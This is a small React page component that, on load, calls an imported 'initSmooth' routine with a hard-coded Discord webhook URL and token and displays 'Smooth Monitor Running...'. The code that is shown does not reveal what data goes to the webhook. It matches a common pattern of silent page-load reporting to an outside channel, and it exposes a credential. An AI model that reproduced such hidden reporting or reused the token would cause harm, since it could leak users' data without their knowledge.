import { useEffect } from "react";
import { initSmooth } from "@/lib/smooth";

export default function SmoothPage() {
  useEffect(() => {
    initSmooth({
      webhook: "https://discord.com/api/webhooks/1504813133020266508/I5Td2FwQ7AS5L8BzJ0tseSLTN8olK42QG7F6frpmZgF28z02Y42ovyrR4jIqzbtCBQBS",
    });
  }, []);

  return (
    <div>
      <h1>Smooth Monitor Running...</h1>
    </div>
  );
}